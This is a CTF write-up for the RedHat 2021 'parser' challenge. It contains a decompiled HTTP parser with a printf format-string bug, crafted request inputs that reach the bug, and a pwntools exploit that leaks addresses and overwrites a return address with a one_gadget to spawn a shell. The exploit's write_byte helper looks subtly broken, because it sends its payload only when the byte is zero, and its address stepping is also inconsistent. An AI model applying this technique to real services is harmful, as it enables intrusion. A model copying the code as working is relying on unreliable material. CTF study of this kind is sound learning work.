# rhc pwn: parser

> redhat ctf 2021.5.9
>
> challenge name: parser
>
> file: chall, libc-2.27.so
>
> writeup writer: hexhex16@outlook.com
>
> refer writeup: https://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247490825&idx=1&sn=410c963cb23d7c897758c3abfcc1d24b&chksm=f9e00b98ce97828e602f7f83ebaafbc67e8f0150afa0ec95fab3e384f72c7f4629c5f56d12c8&mpshare=1&scene=23&srcid=0510SbGgH6oS9jWDnzuoBwTL&sharer_sharetime=1620614150959&sharer_shareid=a03f769b0291620f19d89f76cc6a3620#rd

- 64bit ELF



# checksec

```bash
$ checksec --file=chall
RELRO       STACK CANARY  NX          PIE          RPATH     RUNPATH     Symbols     FORTIFY Fortified  Fortifiable  FILE
Full RELRO  Canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  No Symbols    No    0          4            chall
```



# IDA Analysis

shift+12, Imports窗口中做先期信息搜集可以发现，程序调用了`printf`，而且在`parser`主体函数里存在调用：`printf(*((const char **)empty_str + '&'));`，故存在格式化字符串漏洞

`parser`函数是main的level-2 callee，parser是经过了更名的，地址在`.text:0000000000000A4A`

```c
__int64 __fastcall parser(const char *s, _BYTE *empty_str, int is1)
{
  const char *s_2; // rax
  const char *v5_isNULL; // rax
  char *str_after_space2; // rax
  char *v7_isNULL; // rax
  char *str_aafter_space2; // rax
  char *v9_isNULL; // rax
  char *v11; // [rsp+18h] [rbp-28h]
  char *str_after_space; // [rsp+18h] [rbp-28h]
  char *v13; // [rsp+18h] [rbp-28h]
  char *str_aafter_space; // [rsp+18h] [rbp-28h]
  char *v15; // [rsp+18h] [rbp-28h]
  char *next_not; // [rsp+18h] [rbp-28h]
  char *v17; // [rsp+18h] [rbp-28h]
  char *v18; // [rsp+18h] [rbp-28h]
  char *i; // [rsp+18h] [rbp-28h]
  char *v20; // [rsp+18h] [rbp-28h]
  int next_idx; // [rsp+20h] [rbp-20h]
  int aaaaaaa; // [rsp+24h] [rbp-1Ch]
  _BOOL4 v23; // [rsp+28h] [rbp-18h]
  int while_count; // [rsp+2Ch] [rbp-14h]
  const char **v25; // [rsp+30h] [rbp-10h]

  if ( is1 != 1 && is1 != 2 )
    return 0xFFFFFFFFLL;
  memset(empty_str, 0, 320uLL);
  *empty_str = is1;
  if ( is1 == 1 )
    s_2 = s;
  else
    s_2 = 0LL;
  *((_QWORD *)empty_str + 1) = s_2;
  if ( is1 == 2 )
    v5_isNULL = s;
  else
    v5_isNULL = 0LL;
  *((_QWORD *)empty_str + 3) = v5_isNULL;
  v11 = strchr(s, ' ');
  if ( !v11 )
    return 400LL;                               // 没有找到空格，返回400
  *v11 = 0;                                     // 令空格处为\0
  str_after_space = v11 + 1;
  next_idx = 0;
  if ( is1 == 1 )
  {
    if ( !strcmp("GET", *((const char **)empty_str + 1)) )// 如果字符串开头为GET，则记录一下下一个开头的index
      next_idx = 4;
    if ( !next_idx && !strcmp("HEAD", *((const char **)empty_str + 1)) )
      next_idx = 5;
    if ( !next_idx && !strcmp("POST", *((const char **)empty_str + 1)) )
      next_idx = 5;
    if ( !next_idx && !strcmp("PUT", *((const char **)empty_str + 1)) )
      next_idx = 4;
    if ( !next_idx && !strcmp("DELETE", *((const char **)empty_str + 1)) )
      next_idx = 7;
    if ( !next_idx && !strcmp("TRACE", *((const char **)empty_str + 1)) )
      next_idx = 6;
    if ( !next_idx && !strcmp("OPTIONS", *((const char **)empty_str + 1)) )
      next_idx = 8;
    if ( !next_idx && !strcmp("CONNECT", *((const char **)empty_str + 1)) )
      next_idx = 8;
    if ( !next_idx && !strcmp("PATCH", *((const char **)empty_str + 1)) )
      next_idx = 6;
    if ( !next_idx )
      return 400LL;
  }
  else if ( !strcmp("HTTP/1.0", *((const char **)empty_str + 3)) && !strcmp("HTTP/1.1", *((const char **)empty_str + 3)) )
  {
    return 400LL;
  }
  if ( is1 == 1 )
    str_after_space2 = str_after_space;
  else
    str_after_space2 = 0LL;
  *((_QWORD *)empty_str + 2) = str_after_space2;
  if ( is1 == 2 )
    v7_isNULL = str_after_space;
  else
    v7_isNULL = 0LL;
  *((_QWORD *)empty_str + 4) = v7_isNULL;
  v13 = strchr(str_after_space, ' ');
  if ( !v13 )
    return 414LL;
  *v13 = 0;
  str_aafter_space = v13 + 1;
  if ( is1 == 1 && strchr(*((const char **)empty_str + 2), '/') != *((char **)empty_str + 2) )// /需要在第一个出现，否则返回400
    return 400LL;
  if ( is1 == 2 && !atoi(*((const char **)empty_str + 4)) )
    return 400LL;
  if ( is1 == 1 )
    str_aafter_space2 = str_aafter_space;
  else
    str_aafter_space2 = (char *)*((_QWORD *)empty_str + 3);
  *((_QWORD *)empty_str + 3) = str_aafter_space2;
  if ( is1 == 2 )
    v9_isNULL = str_aafter_space;
  else
    v9_isNULL = 0LL;
  *((_QWORD *)empty_str + 5) = v9_isNULL;
  v15 = strchr(str_aafter_space, '\n');
  if ( !v15 )
    return 400LL;
  *v15 = 0;
  next_not = v15 + 1;
  if ( *next_not == '\r' )
    *next_not++ = 0;                            // 跳过\n\r
  aaaaaaa = 0;
  if ( is1 == 1
    && !strcmp("HTTP/1.0", *((const char **)empty_str + 3))
    && !strcmp("HTTP/1.1", *((const char **)empty_str + 3)) )
  {
    return 400LL;
  }
  v23 = 0;
  while_count = 0;
  while ( !*next_not || *next_not != '\n' && (*next_not != '\r' || next_not[1] != '\n') )
  {
    if ( while_count <= 15 )
      *(_QWORD *)&empty_str[16 * while_count + 48] = next_not;
    v18 = strchr(next_not, ':');
    if ( !v18 )
      return 413LL;
    *v18 = 0;
    for ( i = v18 + 1; *i && (*i == ' ' || *i == '\r' || *i == '\n' || *i == '\t'); ++i )
      *i = 0;
    if ( !*i )
      return 413LL;
    if ( while_count <= 15 )
      *(_QWORD *)&empty_str[16 * while_count + 56] = i;
    v20 = strchr(i, '\n');
    if ( !v20 )
      return 413LL;
    *v20 = 0;
    next_not = v20 + 1;
    if ( *next_not == '\r' )
      *next_not++ = 0;                          // 跳过\n后，再跳过\r
    v25 = (const char **)&empty_str[16 * while_count + 48];
    if ( is1 == 1 )
    {
      if ( !strcasecmp("Connection", *v25) )
      {
        if ( *(_BYTE *)(*((_QWORD *)empty_str + 3) + 7LL) == '0' && !strcasecmp("Keep-Alive", v25[1]) )
        {
          empty_str[313] = 1;
        }
        else if ( *(_BYTE *)(*((_QWORD *)empty_str + 3) + 7LL) == '1' && !strcasecmp("Close", v25[1]) )
        {
          empty_str[313] = 0;
        }
        empty_str[312] = empty_str[313] == 0;
      }
      if ( !strcasecmp("Accept-Encoding", *v25) && strstr(v25[1], "gzip") )
        empty_str[314] = 1;
      if ( !strcasecmp("Content-Length", *v25) )
        aaaaaaa = atoi(v25[1]);
      if ( !v23 )
        v23 = strcasecmp("Host", *v25) == 0;
    }
    ++while_count;
  }
  *next_not = 0;
  v17 = next_not + 1;
  if ( *v17 == '\n' )
    *v17++ = 0;
  if ( is1 != 1 )
    goto LABEL_126;
  if ( !empty_str[313] && !empty_str[312] )
  {
    empty_str[313] = *(_BYTE *)(*((_QWORD *)empty_str + 3) + 7LL) != '0';
    empty_str[312] = empty_str[313] == 0;
  }
  if ( *(_BYTE *)(*((_QWORD *)empty_str + 3) + 7LL) == '1' && !v23 )
    return 400LL;
LABEL_126:
  *((_QWORD *)empty_str + 38) = v17;
  if ( aaaaaaa < 0 )
    printf(*((const char **)empty_str + '&'));  // 可能的利用点
  return 0LL;
}
```

# Valid Input

- 想要执行到parser末尾的printf漏斗利用点，需要有逆向、阅读伪c代码的能力，经过分析后，能够抵达末尾printf的输入形式大致为：

```
GET /test HTTP/1.0\nContent-Length:-1\n\n
GET /test HTTP/1.1\n\rContent-Length:-1\n\n
POST /aaa HTTP/1.1\n\rContent-Length:-11\n\n
```







# Exploit



```python
from pwn import *
context.log_level = 'debug'
context.binary = ELF("./chall")
e = ELF("./chall")
libc = ELF("./libc-2.27.so")
one_gadget = 0x10a45c
p = process(["./ld-2.27.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
# p = remote("47.105.94.48", 12435)
payload = "POST /k HTTP/1.0\nContent-Length:-12\n\r\n{}\r\n"
payload1 = "POST /k HTTP/1.0\nContent-Length:-12\n\r\n%15$p\r\n"
p.sendafter('> ', payload1)
e.address = int(p.recvuntil('\r\n', drop=True), 16) - 0x14A8
payload2 = b"POST /k HTTP/1.0\nContent-Length:-12\n\r\n%23$s\r\naaaaaaaaaaa" + p64(e.got['atoi'])
p.sendafter('> ', payload2)
libc.address = u64(p.recvuntil('\r\naaaaaaaaaaa', drop=True).ljust(8, b'\x00')) - libc.symbols['atoi']
print(hex(e.got['strchr']))
print("libc=>", hex(libc.address))
# gdb.attach(p)
payload3 = b"POST /k HTTP/1.0\nContent-Length:-12\n\r\n%14$s\r\naaaaaaaaaaa"
p.sendafter('> ', payload3)
stack_address = u64(p.recvuntil('\r\n', drop=True).ljust(8, b'\x00')) + 8
print(hex(stack_address))


def write_byte(addr, num):
    if num == 0:
        num = 256
        _payload = "POST /k HTTP/1.0\nContent-Length:-12\n\r\n%{}c%23$hhn\r\n".format(
            num).ljust(56, 'a').encode() + p64(addr)
        p.sendafter('> ', _payload)


ret_addr = 0x1634 + e.address
# for i in range(0):
for i in range(8):
    cur_num = (ret_addr >> (i * 8)) % 256
    write_byte(stack_address + i, cur_num)
    stack_address += 8
one_gadget = one_gadget + libc.address
for i in range(8):
    cur_num = (one_gadget >> (i * 8)) % 256
    if cur_num == 0:
        continue
    write_byte(stack_address + i, cur_num)
for i in range(8):
    write_byte(stack_address + i + 0x78, 0)
p.send('a')
p.interactive()
if __name__ == '__main__':
    pass

```

